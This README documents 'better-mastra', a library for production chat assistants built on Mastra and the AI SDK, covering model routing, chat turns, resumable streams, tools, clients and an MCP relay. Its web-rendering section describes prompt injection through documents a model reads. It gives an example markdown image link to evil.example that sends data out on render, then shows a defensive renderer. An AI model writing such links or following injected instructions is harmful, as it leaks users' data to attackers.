# better-mastra

A small layer on [Mastra](https://mastra.ai) and the [AI SDK](https://ai-sdk.dev) for production chat assistants: one model registry across providers, a chat turn with auth, locks, limits and approvals, streams that survive a dropped connection, and chat clients for React, React Native and Vue.

It stays thin. Mastra runs the agent and keeps the memory, the AI SDK owns the messages and the stream; this package wires them together the way a production app needs and leaves both reachable.

## Install

```sh
bun add better-mastra @mastra/core @mastra/memory @mastra/ai-sdk ai zod
```

ESM only, Node 20+ or Bun. Every peer is optional and loaded only by the subpath that needs it (the table below says which), so a client-only app or one that uses only the MCP relay installs no Mastra. The line above is what a server with a chat needs; add `@mastra/pg` and `pg` for `better-mastra/pg`, `hono` for `better-mastra/hono`, `react` or `vue` for the bindings, and a provider SDK (`@openrouter/ai-sdk-provider`, `@ai-sdk/anthropic`, …) for each model route you give a key.

## What's in it

| Import | What it gives you | Needs |
| --- | --- | --- |
| `better-mastra` | Memory preset, health check, ordered shutdown | `@mastra/core`, `@mastra/memory` |
| `better-mastra/pg`, `better-mastra/libsql` | Mastra storage on Postgres or libSQL that survives dropped connections | `@mastra/pg` + `pg`, or `@mastra/libsql` |
| `better-mastra/models` | Model registry (`route/model@effort` ids), prompt caching, OpenRouter batching, pricing | `ai`, `@ai-sdk/provider`, a provider SDK per route |
| `better-mastra/openrouter` | One OpenRouter route, synchronous, for building models at import time | `@openrouter/ai-sdk-provider` |
| `better-mastra/turn` | `runChatTurn`, the chat agent, request context, reply suggestions, thread handlers | `@mastra/core`, `@mastra/memory`, `@mastra/ai-sdk`, `ai`, `zod` |
| `better-mastra/protocol` | The wire contract: part names, refusal codes, outcomes, `chatTurnBodySchema` | `zod` (`ai` types only); safe in a browser |
| `better-mastra/hono` | The chat route (`POST`, stream, stop) and a local Mastra Studio mount | `hono` (Studio: `@mastra/hono`) |
| `better-mastra/resumable` | Turns that keep running past a disconnect, reconnectable across replicas | a Redis client, or none |
| `better-mastra/tools` | `defineTool`: a tool plus its tier, card and hidden inputs; deferred tools; dry runs | `@mastra/core`, `zod` |
| `better-mastra/client` | Framework-free chat session: turns, approvals, client actions, resume, tool cards | `ai`, `zod` |
| `better-mastra/react`, `better-mastra/vue` | Hooks/composables and `ToolParts` over a chat session | `ai`, `zod`, `react` or `vue` |
| `better-mastra/react/markdown` | Streaming markdown for React Native, word by word with fade-in | `react-native`, `react-native-markdown-display` |
| `better-mastra/dictation` (`/react`, `/vue`, `/server`) | Live speech to text with Soniox | `react` or `vue` for the bindings |
| `better-mastra/embeddings` | Cached query embeddings and batched document embeddings | `ai` |
| `better-mastra/usage` | Metered `generateText`/`generateObject`, model budgets, per-user rate limits | `ai`, `@ai-sdk/provider` |
| `better-mastra/evals` | Eval cases, checks and an LLM judge, run through your production turn | `@mastra/core`, `ai`, `zod` |
| `better-mastra/mcp-relay` | Another MCP server's tools offered on your own MCP server, called as the current user | `@modelcontextprotocol/client` (+ `/server` for `withRelayedTools`) |

Two CLIs ship with it: `better-mastra-evals` and `better-mastra-tool-manifest`.

## Quick start

### Server

```ts
import { Mastra } from '@mastra/core'
import { Hono } from 'hono'
import { createMemory } from 'better-mastra'
import { createChatRoute } from 'better-mastra/hono'
import { createLlmRegistry } from 'better-mastra/models'
import { pgStorage } from 'better-mastra/pg'
import { chatTurnBodySchema, createChatAgent, runChatTurn } from 'better-mastra/turn'
import { RequestContext } from '@mastra/core/request-context'

const llms = await createLlmRegistry({ keys: { openrouter: process.env.OPENROUTER_API_KEY } })
const storage = pgStorage({ connectionString: process.env.DATABASE_URL })
const memory = createMemory({ storage: storage.store })
const agent = createChatAgent({ id: 'chat', memory })
// Your own logger, or false: Mastra's default console logger can write a run's inputs and tool results.
const mastra = new Mastra({ agents: { chat: agent }, storage: storage.store, logger: false })

await storage.init() // once, in the process that migrates

const app = new Hono()

app.route('/', createChatRoute({
	path: '/chat',
	auth: (c) => getUser(c), // null answers 401
	parseBody: (json) => chatTurnBodySchema.safeParse(json).data, // undefined answers 400
	runTurn: (request) =>
		runChatTurn(request, {
			mastra,
			agentId: 'chat',
			memory,
			resolveScope: async ({ auth }) => ({ userId: auth.id }),
			deriveThreadKey: (scope, body) => ({ threadId: body.threadId, resourceId: `user:${scope.userId}` }),
			prepare: async () => {
				const { model, providerOptions } = llms.resolveLlm('google/gemini-3.5-flash@low')
				return {
					requestContext: new RequestContext(),
					plan: { instructions: 'You are a helpful assistant.', model, providerOptions, maxSteps: 8 }
				}
			}
		})
}))
```

`chatTurnBodySchema` (also in the browser-safe `better-mastra/protocol`) parses the body the chat session sends; `chatTurnBodySchema.extend({ pageContext })` adds your own fields.

`runChatTurn` takes the rest as optional ports: `gate` (access and consent), `lock` (one turn per thread), `admit` (usage limits), `sinks` (tool, usage and finished-turn events), `replySuggestions`, `deriveTitle`. Every refusal reaches the client as a fixed error code, never a raw error, and every failure is logged with the stage it happened in. A user message over `maxMessageLength` (32,000 characters) is refused as `message_too_long` (413), so the client can say why.

`sinks.turnFinished` gets the outcome (`turnOutcomes`: `answered`, `stopped`, `interrupted` when a newer turn or a shutdown ended it, `budget_stop`, `timeout`, `error`) and the run's `usage`, typed for `readStreamTextUsage`, `llms.cost` and `withUsage().meterStream(event.usage, …)`.

### Client

```tsx
import { createChatFetch, createChatSession } from 'better-mastra/client'
import { useChatSession } from 'better-mastra/react' // or 'better-mastra/vue'

const session = createChatSession({
	threadId,
	transport: { api: '/chat', fetch: createChatFetch({ onUnauthorized: signOut }) }
})

function Chat() {
	const { messages, status, send, stop } = useChatSession(session, { throttleMs: 50 })
	// …
}
```

The session lives outside the framework, so every screen showing the thread shows the same running answer. `createChatSessions` keeps one per thread and stops the ones off screen.

## Models (`better-mastra/models`)

Every model sits behind one id: `route/model@effort`. The route picks the provider, the effort sets reasoning:

```ts
const llms = await createLlmRegistry({
	keys: {
		openrouter: process.env.OPENROUTER_API_KEY,
		anthropic: process.env.ANTHROPIC_API_KEY
	}
})

llms.resolveLlm('anthropic-direct/claude-sonnet-5-5@medium') // { model, providerOptions, route, modelId }
llms.resolveLlm('google/gemini-3.5-flash') // no known prefix: OpenRouter
llms.resolveMastraLlm('google/gemini-3.5-flash') // typed for a Mastra agent
await llms.cost({ modelId, steps, usage }) // reported by the route, or estimated from pricing
```

A route without a key is not loaded, nor is its SDK, so missing optional peers never break startup. Built-in routes: `openrouter`, `anthropic-direct`, `openai-direct`, `requesty`, `inception`, `vertex-eu`; add or replace routes with `routes`. Keep the full id in config and metrics; only the SDK sees the provider's id. `parseModelId(id, { routes })` reads an id the same way without loading the registry or its keys.

A model missing from the pricing table costs `null` on a route that does not report its own spend (Vertex, Inception, the direct APIs); pass `pricing` for the models you use.

Also here: `withPromptCache` / `promptCacheMiddleware` for provider prompt caching, `withLlmMode('batch')` to send background work through OpenRouter's Batch API, `anthropicSafeZodSchema`, `estimateModelCostUsd`, and `AiBillingError` for 402s.

## Chat turn (`better-mastra/turn`)

- **`createChatAgent`**: a Mastra agent whose instructions, model, tools and options come from the turn plan `prepare` returns, so "what does the model get" has one answer. Turn and first-chunk timeouts, a tool-call budget, retries on provider failure, and `stopAfterTools` to end a run after a question card or a handoff.
- **`runChatTurn`**: one chat request after authentication (see the quick start).
- **`defineRequestContext(schema)`**: typed request context values; `defineRequestContextHolder` for values that must never be serialized into a snapshot or span.
- **`createThreadHandlers`**: list, read and delete the caller's threads, and rate answers. `ownsThread({ memory, threadId, resourceId })` is the check `createChatRoute` needs with `resumable`.
- **`sweepOldThreads`** and **`sweepAbandonedRuns`**: nothing runs them for you. Without a scheduled job of yours, old threads (with the customer text they quote) and suspended approvals stay in the `mastra` schema for good.
- **`createReplySuggestionsAgent`**: short replies offered after an answer.
- **`defineModelArms`**: model experiments by thread: a thread keeps its arm for life.

The plan splits instructions three ways so the provider's cache keeps hitting: `instructions` (stable, cached), `perRequestInstructions` (per thread), and `signal` (per request, sent after the user's message and never stored).

## Tools (`better-mastra/tools`)

One definition per tool: the Mastra tool and what the chat knows about it.

```ts
import { defineTool, toToolSet } from 'better-mastra/tools'

export const tools = [
	defineTool({
		tool: { id: 'tasks.create', description: 'Create a task', inputSchema, execute },
		tier: 'approval', // waits for the user's approval; 'read' runs at once
		card: 'task',
		invalidates: ['tasks'],
		hiddenInputs: { workspaceId: (ctx) => context.read(ctx).workspaceId } // never seen by the model
	})
]

const { tools: toolset, toolTiers } = toToolSet(tools) // for the turn plan
```

`better-mastra-tool-manifest src/tools.ts src/generated/tool-manifest.ts` writes the client's manifest from the same definitions; `--name` names the export, `--type Manifest:./types` annotates it with your type, and `--check` (for CI) fails when the file is out of date. On the client, `createToolRefresh(toolManifest, { tasks: refetchTasks })` is an `onToolResult` that refetches what each tool `invalidates`, typed so a namespace without a refetch fails the typecheck.

A tool without `execute` is a client tool. `meta` keeps your server's own data on a definition (a gate, a permission) without it reaching the manifest. `deferredTool` and `deferredToolSearch` keep a large tool catalog out of the prompt without breaking Anthropic's prompt cache; `markDryRun` turns every write into a marker for evals. `jsonSchemaInput(schema)` takes a JSON Schema, such as an MCP tool's, as a tool input.

Whatever `execute` throws is what the model, the stored thread and the client read. With `maskErrors: true` (or `{ sentence, onError }`), only a `ToolRefusal`'s message and an abort get through; any other error goes to `onError` and the model reads one fixed sentence:

```ts
defineTool({
	tool: { id: 'tasks.rename', description, inputSchema, execute: async ({ taskId }) => {
		const task = await tasks.find(taskId)
		if (!task) throw new ToolRefusal('No task has that id.') // the model reads this and can try again
		return tasks.rename(task) // a database error here reaches only your log
	} },
	tier: 'approval',
	maskErrors: { onError: (error, { tool }) => logger.error('tool failed', { tool, error }) }
})
```

## Chat client (`better-mastra/client`, `/react`, `/vue`)

`createChatSession` owns one conversation: the AI SDK `Chat`, a turn reducer around it, approvals, suspended runs, and client actions.

- **Client actions**: `defineClientAction({ name, description, inputSchema, handler })` gives the model a tool that runs on the device (navigate, open a sheet). Pass them as `clientActions`, read per request, so the screen on top decides.
- **Screen context**: `createScreenContextStack` plus `useScreenContext(stack, { read, actions })` tells the chat what the user is looking at.
- **Tool cards**: `createCardRegistry({ schemas, toolCard })` resolves tool parts to typed cards; `<ToolParts parts registry cards Steps />` draws them, folding runs of steps into an activity list.
- **Streaming text**: `useWordReveal(text, streaming)` reveals whole words every 40 ms. In React Native, `<StreamingMarkdown text streaming />` from `better-mastra/react/markdown` renders it, re-parsing only the last paragraph.
- **Resume**: with `resume: true` and `resumeOn: [resumeOnVisible, resumeOnOnline]` (or `resumeOnAppActive(AppState)` and `resumeOnNetworkRegain(NetInfo)` in React Native) the session reattaches to a running answer.

- **Events**: `onToolResult` per tool result, `onSaved` when a request ended with its answer stored (never for a stop, a failure or a reattach that found nothing), `onFailure` for analytics. `pendingApproval(turn)` is the approval a waiting turn waits for. `prepareBody(request, body)` gets the default body to add your fields to. A refusal carries `retryAfterSeconds` when the server sent one.

Nothing in `/client` or `/react` touches the DOM, so both run in React Native.

### Rendering an answer on the web

The answer is untrusted text: the model writes it from whatever its tools read, and a document can tell it what to write. A markdown renderer built for your own content will happily load `![](https://evil.example/?d=…)` as the answer streams, sending what the model read to another host with no click. Render answers with raw HTML off, no images or other remote loads, and links limited to `isSafeUrl` from `better-mastra/client` (the React Native `StreamingMarkdown` already does this). With markdown-it:

```ts
import MarkdownIt from 'markdown-it'
import { isSafeUrl } from 'better-mastra/client'

const answerMarkdown = new MarkdownIt({ html: false, linkify: true })
answerMarkdown.disable(['image'])
answerMarkdown.validateLink = (url) => isSafeUrl(url)
// Open links in a new tab without the opener.
answerMarkdown.renderer.rules.link_open = (tokens, i, options, _env, self) => {
	tokens[i]?.attrSet('target', '_blank')
	tokens[i]?.attrSet('rel', 'noopener noreferrer nofollow')
	return self.renderToken(tokens, i, options)
}

const html = answerMarkdown.render(text)
```

## Runtime presets

Storage and memory presets are synchronous; pools connect on their first query, so a process can build its Mastra at import time:

```ts
import { Mastra } from '@mastra/core'
import { createMemory, shutdown } from 'better-mastra' // presets come from the package root
import { openRouterRoute } from 'better-mastra/openrouter'
import { pgStorage } from 'better-mastra/pg' // or libsqlStorage from 'better-mastra/libsql'

const storage = pgStorage({ connectionString: process.env.DATABASE_URL })
const models = openRouterRoute({ apiKey: process.env.OPENROUTER_API_KEY })
const memory = createMemory({ storage: storage.store, observer: models.model('google/gemini-3.5-flash') })
export const mastra = new Mastra({ storage: storage.store })

await storage.init() // once, in the process that migrates

// on SIGTERM: memory work settles, Mastra drains, then storage closes
await shutdown({ mastra, memory, storage })
```

`pgStorage` keeps Mastra in its own schema (`mastra`, plus `mastra_observability`), turns keep-alive on and logs a severed idle connection instead of crashing. `createMemory` keeps message history in thread scope; pass `observer` to turn on observational memory. `checkHealth({ checks })` pings stores and checks provider keys without spending tokens.

`pgStorage` and `libsqlStorage` from the package root are the same presets loaded on call (they return promises); they stay for compatibility.

## Resumable streams (`better-mastra/resumable`)

Opt-in. A dropped connection no longer aborts the turn: the client reconnects with AI SDK `reconnectToStream` (`useChat({ resume: true })`) and gets a full replay of the current assistant message plus the live tail (`resumeStreamIsReplay: true`, the `DefaultChatTransport` default).

With the chat route, pass the registry and an ownership check; the route then adds `GET {path}/:threadId/stream` and `POST {path}/:threadId/stop`, which the chat client in `better-mastra/client` already calls:

```ts
import { RedisClient } from 'bun'
import { createChatRoute } from 'better-mastra/hono'
import { bunRedis, createResumableStreams } from 'better-mastra/resumable'

// A command client with command timeouts cannot duplicate itself: pass `connect` for the blocking connections.
const resumable = createResumableStreams({
	redis: bunRedis(commands, { connect: () => new RedisClient(process.env.REDIS_URL) })
})

app.route('/', createChatRoute({
	path: '/chat', auth, parseBody, runTurn, resumable,
	ownsThread: (threadId, auth) => ownsThread({ memory, threadId, resourceId: `user:${auth.id}` })
}))

// shutdown: new turns get 503 { status: 'draining' }, which the client retries; active ones get drainTimeoutMs (90 s)
await resumable.close()
```

`close()` waits up to `drainTimeoutMs` (90 s, past the agent's 80 s turn timeout) for running turns, then aborts the rest; keep your platform's shutdown grace longer than that. A turn the registry aborts carries the reason (`stop`, `superseded`, `shutdown`) on its signal, and only `stop` counts as the user stopping.

Leave `redis` out for one process (local development, a single instance): turns are then resumable and stoppable on that process only.

Without the route, wire it yourself:

```ts
// POST /chat/:threadId — do not tie the run to request.signal
const abort = new AbortController()
const stream = await resumable.start({ threadKey: threadId, stream: uiMessageStream, abort })

// GET /chat/:threadId/stream
const resumed = await resumable.reconnect(threadId, request.signal)
if (!resumed) return new Response(null, { status: 204 })

// POST /chat/:threadId/stop — works from any replica
await resumable.stop(threadId)
```

A new `start()` on a thread whose turn still runs aborts that turn, on this replica or another. A stopped turn gets `stopTimeoutMs` (5 s) to end its stream; after that it ends with an `abort` chunk, so a tool that ignores its abort signal cannot keep the turn open.

The adapters need Redis 6.2 or newer (`SET … GET`). Use `ioRedis(client)` for ioredis. Both adapters open extra connections with `duplicate()`: one subscriber per replica, and one per cross-replica reader (for `XREAD BLOCK`). When the command client cannot duplicate itself (one wrapped to time its commands out), pass the connections separately: `bunRedis(commands, { connect: () => newSubscriberConnection() })`. Sticky sessions keep reconnects on the owner, where they cost nothing.

Use `upstashRedis(client)` for `@upstash/redis`. Upstash has no blocking `XREAD`, so a cross-replica reader polls every `pollMs` (200 ms); pass `() => Redis.fromEnv()` to create the client on first use.

An app that already holds a per-thread lock can keep the locator in the lock's value with `locator: { read, write, expire }`. The locator then lives exactly as long as the lock. `expire` renews it while the turn runs and shortens it to `graceMs` after; leave it out when the lock renews itself. `write` may resolve with the locator it replaced, so a turn still running on another replica is aborted:

```ts
createResumableStreams({
	redis: upstashRedis(() => Redis.fromEnv()),
	locator: {
		read: (threadId) => readLockValue(threadId), // what follows the lock token
		write: (threadId, locator, ttlMs) => writeLockValue(threadId, locator, ttlMs),
		expire: (threadId, ttlMs) => redis.pexpire(lockKey(threadId), ttlMs)
	}
})
```

<details>
<summary>How it works, Redis cost and failure behaviour</summary>

Chunks are buffered in memory (consecutive text, reasoning and tool-input deltas merged) and fanned out to subscribers. A per-thread locator `{ streamId, owner }` in Redis says which replica owns the turn; the owner writes it once it listens on its control channel. Reconnecting to the owner is served from memory. Reconnecting to another replica publishes a spill request on the owner's control channel; on the first request the owner writes its buffer in one `XADD` to the turn's spill stream, then mirrors new chunks in 50 ms batches (first one immediate), one `XADD` at a time so entries stay ordered on HTTP clients too, until a terminal marker. Every reader of the turn, including one that reconnects again, follows that same stream with `XREAD` from the start.

Redis ops for a ~1,500-chunk turn:

| Design | Redis ops |
|---|---|
| Mastra durable agents (`CachingPubSub`: cache write + publish per chunk) | ~3,000–4,500 |
| Coalesced SETEX + PUBLISH | ~600 |
| This, no reconnect | 2 (locator SET … GET, final PEXPIRE) + 1 PEXPIRE per 10 s of turn, +1 PUBLISH when the thread's last turn ran on another replica |
| This, same-replica reconnect | +0 for a running turn, +1 GET for a finished one |
| This, cross-replica reconnect | +1 GET and PUBLISH per reconnect; once per turn +1 XADD per 50 ms batch, 2 EXPIREs and 1 EXPIRE per 30 s; reader XREADs |

Failure behaviour: a buffer over `maxBufferBytes` (2 MB) keeps streaming but new reconnects get 204. If the owner crashes, a cross-replica reconnect gets 204 within 2 s, and a reader already following ends with an `error` chunk after `idleTimeoutMs`; the client reloads the thread from Mastra memory. A reader whose own Redis read fails ends with an `error` chunk too; a failed liveness check is taken as a blip and the reader keeps waiting. If Redis is down, turns still run and same-replica reconnects work; cross-replica reconnects return 204. Finished turns stay resumable for `graceMs` (30 s).

</details>

## Usage and limits (`better-mastra/usage`)

`withUsage({ llms, sink, onSinkError })` returns `generateText`, `generateObject` and `meterStream` that report every run's tokens and cost to your sink; `meterStream` also takes a finished run's values, such as the turn's `usage`. A sink that throws loses its row: log it with `onSinkError`. `createModelBudget` caps concurrent background model calls per provider and backs off on 429s.

`admitUserRequest` charges one request against every window of a user's operation at once, or refuses it with the seconds until the fullest window has room. The keys hold an HMAC of the user id, never the id itself. Pass any Redis client's `EVAL`:

```ts
import { admitUserRequest } from 'better-mastra/usage'

const admission = await admitUserRequest({
	runScript: (script, keys, args) => redis.send('EVAL', [script, String(keys.length), ...keys, ...args.map(String)]),
	secret: process.env.AUTH_SECRET,
	keyPrefix: 'app:ai-usage',
	operation: 'receipt',
	userId,
	windows: [
		{ name: 'minute', seconds: 60, limit: 5 },
		{ name: 'day', seconds: 86_400, limit: 50 }
	]
})
// { kind: 'admitted' } | { kind: 'limited', retryAfterSeconds } | { kind: 'unavailable', error }
```

`unavailable` means Redis failed or did not answer within `timeoutMs` (3 s), and the choice is yours: let the request through or refuse it. `admissionRefusal` makes it explicit for the turn's `admit`, and a limited request reaches the client with `Retry-After`:

```ts
admit: async (scope) =>
	admissionRefusal(await admitUserRequest({ ...limits, userId: scope.userId }), {
		whenUnavailable: 'admit', // fail open; 'refuse' answers temporarily_unavailable
		onUnavailable: (error) => logger.warn('usage limit unavailable', { error })
	})
```

## Dictation (`better-mastra/dictation`)

Live speech to text with [Soniox](https://soniox.com). The server issues single-use keys so the account key never leaves it:

```ts
import { issueSonioxTemporaryKey } from 'better-mastra/dictation/server'

app.post('/dictation/key', async () => Response.json(await issueSonioxTemporaryKey({ apiKey: process.env.SONIOX_API_KEY, region: 'eu' })))
```

The client uses `useDictation({ locale, requestKey, microphone, onDictated })` from `/react` (React Native: `audioApiMicrophone(() => import('react-native-audio-api'))`) or `/vue` (browser microphone by default). It returns `phase`, `start`, `stop`, `cancel` and the live transcript.

## Embeddings (`better-mastra/embeddings`)

`createEmbedder({ model, cache })` gives `embedQuery` for the hot path (in-process cache in front of a shared Redis one, concurrent calls for one query share a request) and `embedMany` for indexing (batched, bounded concurrency, every vector checked).

## Evals (`better-mastra/evals`)

Real turns through your production turn, scored by hard checks and an LLM judge. Write an `evals.config.ts`:

```ts
import { defineEvalConfig } from 'better-mastra/evals'

export default defineEvalConfig({
	cases,
	defaultModel: 'google/gemini-3.5-flash',
	promptVersion: '2026-10-01',
	run: (testCase, { modelId }) => runEvalCase(/* your production turn */),
	judge: { version: '1', judge: myJudge }
})
```

```sh
bunx --bun better-mastra-evals --suite smoke --model google/gemini-3.5-flash --model anthropic-direct/claude-sonnet-5-5
```

Several `--model` flags print a model comparison; `--compare` diffs against a saved report.

## MCP relay (`better-mastra/mcp-relay`)

Offers a remote MCP server's tools on your own MCP server, so its consumers use them as they use yours. Each call goes to the remote as the user who made it, with headers your server derives for that user. The remote's descriptions, results and instructions pass through unchanged.

```ts
import { createMcpRelay, withRelayedTools } from 'better-mastra/mcp-relay'

// Once per remote, at module scope.
const feedback = createMcpRelay<{ userId: string }>({
	url: new URL('/mcp/reporter', feedbackBaseUrl),
	prefix: 'feedback_', // optional, put before every remote tool's name
	headers: async ({ userId }) => ({ Authorization: `Bearer ${await reporterTokenFor(userId)}` }),
	onError: (error, event) => logger.warn('Feedback relay failed', { ...event, error }) // never gets arguments
})
feedback.warm() // discover at boot, so no request waits for it

// Per request, around whatever registers your own tools (here orpc-fn):
const handler = createMcpHandler(async ({ authInfo }) => {
	const { userId } = authInfo.extra.context
	const server = new McpServer(
		{ name: 'app', version: '1.0.0' },
		{ instructions: `${ownInstructions}\n\n${await feedback.instructions()}`, capabilities: { tools: {} } }
	)
	registerMcpTools(withRelayedTools(server.server, [feedback], { caller: { userId } }), router, options)
	return server
})
```

- `withRelayedTools` keeps your `tools/list` and `tools/call` handlers and answers both with your tools and the relayed ones. A call to one of your tools never reaches a remote. Your server must declare the `tools` capability.
- Nothing reaches the remote until a relayed tool is listed or called, `instructions()` is read or `warm()` is called. Then the relay discovers the remote, without a caller's headers, keeps the answer, and refreshes it in the background once it is older than `discovery.refreshAfterMs` (10 minutes), so a remote's new tools arrive without a restart. On a 2026-07-28 remote each call is then one HTTP request; a 2025-era remote gets an `initialize` per call.
- A remote that is down, or whose whole discovery takes longer than `discovery.timeoutMs` (5 s), leaves your own tools working: the listing has only yours, `instructions()` gives `''`, a call says the service could not be reached, and the relay tries again after `discovery.retryAfterMs` (30 s).
- `known: { tools, instructions }` (such as the list the remote's SDK ships) is offered at once, before any discovery answered, and a call to one of those tools goes to the remote even while discovery fails. Then nothing waits on the remote.
- `tools: { file_feedback: { as: 'send_feedback' } }` offers only the tools you name, under names you choose. `hiddenInputs: { app: (caller) => caller.app }` removes an input from every listed schema and fills it on each call, for the tools whose schema has it.
- A refused credential (401, 403), any other HTTP failure and a remote error come back as a tool error result the agent can read. Only an aborted call throws. Neither the error text nor `onError` repeats the call's arguments.
- A relayed tool named like one of yours, or like another relay's, fails `tools/list`. Give the relay a `prefix`.
- `relay.tools()` and `relay.callTool(name, args, caller)` are there for a server that registers its tools another way.

The subpath loads `@modelcontextprotocol/client` and nothing from Mastra or the AI SDK, so an app without them can use it: install `better-mastra @modelcontextprotocol/client @modelcontextprotocol/server` (MCP SDK 2.x). Every Mastra and AI SDK peer is optional, so nothing else is installed for it.

## Mastra Studio

`mountStudio({ mastra, prepareRequestContext })` from `better-mastra/hono` mounts Mastra's API for [Studio](https://mastra.ai/docs/studio) on a developer's machine only: off in production, and it answers only local requests.

## License

MIT
